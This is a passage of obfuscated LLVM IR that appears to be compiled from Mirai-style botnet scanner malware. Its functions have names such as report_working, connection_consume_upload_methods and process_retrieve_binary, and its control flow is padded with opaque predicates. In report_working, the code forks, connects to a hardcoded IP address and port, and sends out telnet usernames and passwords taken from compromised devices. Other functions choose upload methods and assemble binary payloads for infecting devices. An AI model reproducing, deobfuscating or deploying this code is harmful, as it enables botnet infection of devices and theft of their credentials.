  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %69
  %78 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %79 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %78, i32 0, i32 8
  %80 = getelementptr inbounds [16 x i8], [16 x i8]* %79, i32 0, i32 0
  %81 = call i8* @strcpy(i8* %80, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.138, i32 0, i32 0)) #7
  %82 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %83 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %82, i32 0, i32 14
  store i16 41, i16* %83, align 2
  %84 = load i32, i32* @x.33
  %85 = load i32, i32* @y.34
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %97

; <label>:92:                                     ; preds = %originalBBpart214
  %93 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %94 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %93, i32 0, i32 8
  %95 = getelementptr inbounds [16 x i8], [16 x i8]* %94, i32 0, i32 0
  %96 = call i8* @strcpy(i8* %95, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.109, i32 0, i32 0)) #7
  br label %97

; <label>:97:                                     ; preds = %92, %originalBBpart218
  %98 = load i32, i32* %5, align 4
  store i32 %98, i32* %2, align 4
  br label %99

; <label>:99:                                     ; preds = %97, %20
  %100 = load i32, i32* @x.33
  %101 = load i32, i32* @y.34
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %99
  %108 = load i32, i32* %2, align 4
  %109 = load i32, i32* @x.33
  %110 = load i32, i32* @y.34
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  ret i32 %108

originalBBalteredBB:                              ; preds = %originalBB, %21
  %117 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %118 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %117, i32 0, i32 7
  %119 = getelementptr inbounds [8192 x i8], [8192 x i8]* %118, i32 0, i32 0
  %120 = load i32, i32* %5, align 4
  %_ = sub i32 0, %120
  %gen = add i32 %_, 1
  %_1 = shl i32 %120, 1
  %121 = sub nsw i32 %120, 1
  %122 = call i32 @util_memsearch(i8* %119, i32 %121, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i32 0, i32 0), i32 5)
  %123 = icmp ne i32 %122, -1
  br label %originalBB

originalBB2alteredBB:                             ; preds = %originalBB2, %45
  %124 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %125 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %124, i32 0, i32 7
  %126 = getelementptr inbounds [8192 x i8], [8192 x i8]* %125, i32 0, i32 0
  %127 = load i32, i32* %5, align 4
  %_3 = sub i32 %127, 1
  %gen4 = mul i32 %_3, 1
  %_5 = shl i32 %127, 1
  %_6 = sub i32 %127, 1
  %gen7 = mul i32 %_6, 1
  %_8 = sub i32 0, %127
  %gen9 = add i32 %_8, 1
  %_10 = sub i32 0, %127
  %gen11 = add i32 %_10, 1
  %_12 = shl i32 %127, 1
  %128 = sub nsw i32 %127, 1
  %129 = call i32 @util_memsearch(i8* %126, i32 %128, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.137, i32 0, i32 0), i32 5)
  %130 = icmp ne i32 %129, -1
  br label %originalBB2

originalBB16alteredBB:                            ; preds = %originalBB16, %69
  %131 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %132 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %131, i32 0, i32 8
  %133 = getelementptr inbounds [16 x i8], [16 x i8]* %132, i32 0, i32 0
  %134 = call i8* @strcpy(i8* %133, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.138, i32 0, i32 0)) #7
  %135 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %136 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %135, i32 0, i32 14
  store i16 41, i16* %136, align 2
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %99
  %137 = load i32, i32* %2, align 4
  br label %originalBB20
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i32, %struct.scanner_connection*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.resolv_entries*, align 8
  %13 = alloca %union.__SOCKADDR_ARG, align 8
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store %struct.scanner_connection* %2, %struct.scanner_connection** %7, align 8
  store i32 %3, i32* %8, align 4
  %14 = call i32 @fork() #7
  store i32 %14, i32* %10, align 4
  store %struct.resolv_entries* null, %struct.resolv_entries** %12, align 8
  %15 = load i32, i32* %10, align 4
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %10, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %37

; <label>:20:                                     ; preds = %17, %4
  %21 = load i32, i32* @x.35
  %22 = load i32, i32* @y.36
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %20
  %29 = load i32, i32* @x.35
  %30 = load i32, i32* @y.36
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

; <label>:37:                                     ; preds = %17
  %38 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %38, i32* %11, align 4
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37
  call void @exit(i32 0) #8
  unreachable

; <label>:41:                                     ; preds = %37
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = call i32 @htonl(i32 -1335130672) #9
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  store i32 %43, i32* %45, align 4
  %46 = call zeroext i16 @htons(i16 zeroext 1293) #9
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  %48 = load i32, i32* %11, align 4
  %49 = bitcast %union.__SOCKADDR_ARG* %13 to %struct.sockaddr**
  %50 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %50, %struct.sockaddr** %49, align 8
  %51 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %13, i32 0, i32 0
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = call i32 @connect(i32 %48, %struct.sockaddr* %52, i32 16)
  %54 = icmp eq i32 %53, -1
  br i1 %54, label %55, label %74

; <label>:55:                                     ; preds = %41
  %56 = load i32, i32* @x.35
  %57 = load i32, i32* @y.36
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i32, i32* %11, align 4
  %65 = call i32 @close(i32 %64)
  call void @exit(i32 0) #8
  %66 = load i32, i32* @x.35
  %67 = load i32, i32* @y.36
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  unreachable

; <label>:74:                                     ; preds = %41
  %75 = load i32, i32* %11, align 4
  %76 = load i32, i32* %5, align 4
  %77 = and i32 %76, 255
  %78 = load i32, i32* %5, align 4
  %79 = lshr i32 %78, 8
  %80 = and i32 %79, 255
  %81 = load i32, i32* %5, align 4
  %82 = lshr i32 %81, 16
  %83 = and i32 %82, 255
  %84 = load i32, i32* %5, align 4
  %85 = lshr i32 %84, 24
  %86 = and i32 %85, 255
  %87 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %88 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %87, i32 0, i32 0
  %89 = load %struct.scanner_auth*, %struct.scanner_auth** %88, align 8
  %90 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %89, i32 0, i32 0
  %91 = load i8*, i8** %90, align 8
  %92 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %93 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %92, i32 0, i32 0
  %94 = load %struct.scanner_auth*, %struct.scanner_auth** %93, align 8
  %95 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %94, i32 0, i32 1
  %96 = load i8*, i8** %95, align 8
  %97 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %98 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %97, i32 0, i32 8
  %99 = getelementptr inbounds [16 x i8], [16 x i8]* %98, i32 0, i32 0
  %100 = load i32, i32* %8, align 4
  %101 = icmp eq i32 %100, 1
  %102 = select i1 %101, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.129, i32 0, i32 0)
  %103 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %104 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %103, i32 0, i32 1
  %105 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %104, i32 0, i32 1
  %106 = load i32, i32* %105, align 4
  %107 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %108 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %107, i32 0, i32 9
  %109 = load i8, i8* %108, align 4
  %110 = zext i8 %109 to i32
  %111 = call i32 (i32, i8*, ...) @fdsend(i32 %75, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.127, i32 0, i32 0), i32 %77, i32 %80, i32 %83, i32 %86, i8* %91, i8* %96, i8* %99, i8* %102, i32 %106, i32 %110)
  %112 = load i32, i32* %11, align 4
  %113 = call i32 @close(i32 %112)
  call void @exit(i32 0) #8
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %20
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %114 = load i32, i32* %11, align 4
  %115 = call i32 @close(i32 %114)
  call void @exit(i32 0) #8
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @connection_consume_upload_methods(%struct.scanner_connection*) #0 {
  %2 = load i32, i32* @x.37
  %3 = load i32, i32* @y.38
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca %struct.scanner_connection*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %11, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %15 = call i8* @table_retrieve_val(i32 12, i32* %14)
  store i8* %15, i8** %12, align 8
  %16 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %17 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %16, i32 0, i32 7
  %18 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i32 0, i32 0
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 4
  %21 = load i32, i32* %20, align 8
  %22 = load i8*, i8** %12, align 8
  %23 = load i32, i32* %14, align 4
  %24 = sub nsw i32 %23, 1
  %25 = call i32 @util_memsearch(i8* %18, i32 %21, i8* %22, i32 %24)
  store i32 %25, i32* %13, align 4
  call void @table_lock_val(i8 zeroext 12)
  %26 = load i32, i32* %13, align 4
  %27 = icmp eq i32 %26, -1
  %28 = load i32, i32* @x.37
  %29 = load i32, i32* @y.38
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %27, label %36, label %37

; <label>:36:                                     ; preds = %originalBBpart2
  store i32 0, i32* %10, align 4
  br label %100

; <label>:37:                                     ; preds = %originalBBpart2
  %38 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %39 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %38, i32 0, i32 7
  %40 = getelementptr inbounds [8192 x i8], [8192 x i8]* %39, i32 0, i32 0
  %41 = load i32, i32* %13, align 4
  %42 = sub nsw i32 %41, 1
  %43 = call i32 @util_memsearch(i8* %40, i32 %42, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.148, i32 0, i32 0), i32 10)
  %44 = icmp ne i32 %43, -1
  br i1 %44, label %45, label %49

; <label>:45:                                     ; preds = %37
  %46 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %47 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %46, i32 0, i32 1
  %48 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %47, i32 0, i32 1
  store i32 1, i32* %48, align 4
  br label %82

; <label>:49:                                     ; preds = %37
  %50 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %51 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %50, i32 0, i32 7
  %52 = getelementptr inbounds [8192 x i8], [8192 x i8]* %51, i32 0, i32 0
  %53 = load i32, i32* %13, align 4
  %54 = sub nsw i32 %53, 1
  %55 = call i32 @util_memsearch(i8* %52, i32 %54, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.149, i32 0, i32 0), i32 10)
  %56 = icmp ne i32 %55, -1
  br i1 %56, label %57, label %61

; <label>:57:                                     ; preds = %49
  %58 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %59 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %58, i32 0, i32 1
  %60 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %59, i32 0, i32 1
  store i32 2, i32* %60, align 4
  br label %81

; <label>:61:                                     ; preds = %49
  %62 = load i32, i32* @x.37
  %63 = load i32, i32* @y.38
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %61
  %70 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %71 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %70, i32 0, i32 1
  %72 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %71, i32 0, i32 1
  store i32 0, i32* %72, align 4
  %73 = load i32, i32* @x.37
  %74 = load i32, i32* @y.38
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %81

; <label>:81:                                     ; preds = %originalBBpart212, %57
  br label %82

; <label>:82:                                     ; preds = %81, %45
  %83 = load i32, i32* @x.37
  %84 = load i32, i32* @y.38
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %82
  %91 = load i32, i32* %13, align 4
  store i32 %91, i32* %10, align 4
  %92 = load i32, i32* @x.37
  %93 = load i32, i32* @y.38
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %100

; <label>:100:                                    ; preds = %originalBBpart216, %36
  %101 = load i32, i32* %10, align 4
  ret i32 %101

originalBBalteredBB:                              ; preds = %originalBB, %1
  %102 = alloca i32, align 4
  %103 = alloca %struct.scanner_connection*, align 8
  %104 = alloca i8*, align 8
  %105 = alloca i32, align 4
  %106 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %103, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %107 = call i8* @table_retrieve_val(i32 12, i32* %106)
  store i8* %107, i8** %104, align 8
  %108 = load %struct.scanner_connection*, %struct.scanner_connection** %103, align 8
  %109 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %108, i32 0, i32 7
  %110 = getelementptr inbounds [8192 x i8], [8192 x i8]* %109, i32 0, i32 0
  %111 = load %struct.scanner_connection*, %struct.scanner_connection** %103, align 8
  %112 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %111, i32 0, i32 4
  %113 = load i32, i32* %112, align 8
  %114 = load i8*, i8** %104, align 8
  %115 = load i32, i32* %106, align 4
  %_ = sub i32 0, %115
  %gen = add i32 %_, 1
  %_1 = sub i32 0, %115
  %gen2 = add i32 %_1, 1
  %_3 = shl i32 %115, 1
  %_4 = sub i32 0, %115
  %gen5 = add i32 %_4, 1
  %_6 = sub i32 0, %115
  %gen7 = add i32 %_6, 1
  %_8 = sub i32 0, %115
  %gen9 = add i32 %_8, 1
  %116 = sub nsw i32 %115, 1
  %117 = call i32 @util_memsearch(i8* %110, i32 %113, i8* %114, i32 %116)
  store i32 %117, i32* %105, align 4
  call void @table_lock_val(i8 zeroext 12)
  %118 = load i32, i32* %105, align 4
  %119 = icmp eq i32 %118, -1
  br label %originalBB

originalBB10alteredBB:                            ; preds = %originalBB10, %61
  %120 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %121 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %120, i32 0, i32 1
  %122 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %121, i32 0, i32 1
  store i32 0, i32* %122, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %82
  %123 = load i32, i32* %13, align 4
  store i32 %123, i32* %10, align 4
  br label %originalBB14
}

; Function Attrs: noinline nounwind uwtable
define internal %struct.payload* @get_retrieve_binary(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.payload*, align 8
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca %struct.payload*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 0, i32* %4, align 4
  %6 = load i32, i32* %4, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 %7
  store %struct.payload* %8, %struct.payload** %5, align 8
  br label %9

; <label>:9:                                      ; preds = %38, %1
  %10 = load %struct.payload*, %struct.payload** %5, align 8
  %11 = icmp ne %struct.payload* %10, null
  br i1 %11, label %12, label %43

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, 4
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %12
  br label %43

; <label>:16:                                     ; preds = %12
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 11
  %19 = load i8, i8* %18, align 2
  %20 = zext i8 %19 to i32
  %21 = load %struct.payload*, %struct.payload** %5, align 8
  %22 = getelementptr inbounds %struct.payload, %struct.payload* %21, i32 0, i32 0
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %20, %24
  br i1 %25, label %26, label %38

; <label>:26:                                     ; preds = %16
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 14
  %29 = load i16, i16* %28, align 2
  %30 = zext i16 %29 to i32
  %31 = load %struct.payload*, %struct.payload** %5, align 8
  %32 = getelementptr inbounds %struct.payload, %struct.payload* %31, i32 0, i32 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 %30, %34
  br i1 %35, label %36, label %38

; <label>:36:                                     ; preds = %26
  %37 = load %struct.payload*, %struct.payload** %5, align 8
  store %struct.payload* %37, %struct.payload** %2, align 8
  br label %44

; <label>:38:                                     ; preds = %26, %16
  %39 = load %struct.payload*, %struct.payload** %5, align 8
  %40 = getelementptr inbounds %struct.payload, %struct.payload* %39, i32 1
  store %struct.payload* %40, %struct.payload** %5, align 8
  %41 = load i32, i32* %4, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %4, align 4
  br label %9

; <label>:43:                                     ; preds = %15, %9
  store %struct.payload* null, %struct.payload** %2, align 8
  br label %44

; <label>:44:                                     ; preds = %43, %36
  %45 = load %struct.payload*, %struct.payload** %2, align 8
  ret %struct.payload* %45
}

; Function Attrs: noinline nounwind uwtable
define internal %struct.binary* @process_retrieve_binary(%struct.payload*) #0 {
  %2 = alloca %struct.payload*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.binary*, align 8
  %6 = alloca [5 x i8], align 1
  %7 = alloca i32, align 4
  %8 = alloca [256 x i8], align 16
  store %struct.payload* %0, %struct.payload** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  store i32 0, i32* %7, align 4
  %9 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %9, i8 0, i64 256, i32 16, i1 false)
  %10 = load %struct.payload*, %struct.payload** %2, align 8
  %11 = getelementptr inbounds %struct.payload, %struct.payload* %10, i32 0, i32 3
  %12 = load i16, i16* %11, align 8
  %13 = zext i16 %12 to i32
  %14 = sdiv i32 %13, 64
  %15 = add nsw i32 %14, 1
  %16 = sext i32 %15 to i64
  %17 = call noalias i8* @calloc(i64 %16, i64 16) #7
  %18 = bitcast i8* %17 to %struct.binary*
  store %struct.binary* %18, %struct.binary** %5, align 8
  store i32 0, i32* %3, align 4
  br label %19

; <label>:19:                                     ; preds = %originalBBpart219, %1
  %20 = load i32, i32* @x.41
  %21 = load i32, i32* @y.42
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.payload*, %struct.payload** %2, align 8
  %30 = getelementptr inbounds %struct.payload, %struct.payload* %29, i32 0, i32 3
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = sdiv i32 %32, 64
  %34 = add nsw i32 %33, 1
  %35 = icmp slt i32 %28, %34
  %36 = load i32, i32* @x.41
  %37 = load i32, i32* @y.42
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %35, label %44, label %70

; <label>:44:                                     ; preds = %originalBBpart2
  %45 = call noalias i8* @malloc(i64 256) #7
  %46 = load %struct.binary*, %struct.binary** %5, align 8
  %47 = load i32, i32* %3, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.binary, %struct.binary* %46, i64 %48
  %50 = getelementptr inbounds %struct.binary, %struct.binary* %49, i32 0, i32 0
  store i8* %45, i8** %50, align 8
  br label %51

; <label>:51:                                     ; preds = %44
  %52 = load i32, i32* @x.41
  %53 = load i32, i32* @y.42
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB2, label %originalBB2alteredBB

originalBB2:                                      ; preds = %originalBB2alteredBB, %51
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  %62 = load i32, i32* @x.41
  %63 = load i32, i32* @y.42
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart219, label %originalBB2alteredBB

originalBBpart219:                                ; preds = %originalBB2
  br label %19

; <label>:70:                                     ; preds = %originalBBpart2
  br label %71

; <label>:71:                                     ; preds = %originalBBpart260, %70
  %72 = load i32, i32* @x.41
  %73 = load i32, i32* @y.42
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %71
  store i32 0, i32* %3, align 4
  %80 = load i32, i32* @x.41
  %81 = load i32, i32* @y.42
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %88

; <label>:88:                                     ; preds = %125, %originalBBpart223
  %89 = load i32, i32* %3, align 4
  %90 = load %struct.payload*, %struct.payload** %2, align 8
  %91 = getelementptr inbounds %struct.payload, %struct.payload* %90, i32 0, i32 3
  %92 = load i16, i16* %91, align 8
  %93 = zext i16 %92 to i32
  %94 = icmp slt i32 %89, %93
  br i1 %94, label %95, label %128

; <label>:95:                                     ; preds = %88
  %96 = load i32, i32* %3, align 4
  %97 = icmp eq i32 %96, 64
  br i1 %97, label %107, label %98

; <label>:98:                                     ; preds = %95
  %99 = load i32, i32* %4, align 4
  %100 = load i32, i32* %3, align 4
  %101 = add nsw i32 %99, %100
  %102 = load %struct.payload*, %struct.payload** %2, align 8
  %103 = getelementptr inbounds %struct.payload, %struct.payload* %102, i32 0, i32 3
  %104 = load i16, i16* %103, align 8
  %105 = zext i16 %104 to i32
  %106 = icmp sge i32 %101, %105
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %98, %95
  br label %128

; <label>:108:                                    ; preds = %98
  %109 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %109, i8 0, i64 5, i32 1, i1 false)
  %110 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i32 0, i32 0
  %111 = load %struct.payload*, %struct.payload** %2, align 8
  %112 = getelementptr inbounds %struct.payload, %struct.payload* %111, i32 0, i32 2
  %113 = load i8*, i8** %112, align 8
  %114 = load i32, i32* %4, align 4
  %115 = load i32, i32* %3, align 4
  %116 = add nsw i32 %114, %115
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8, i8* %113, i64 %117
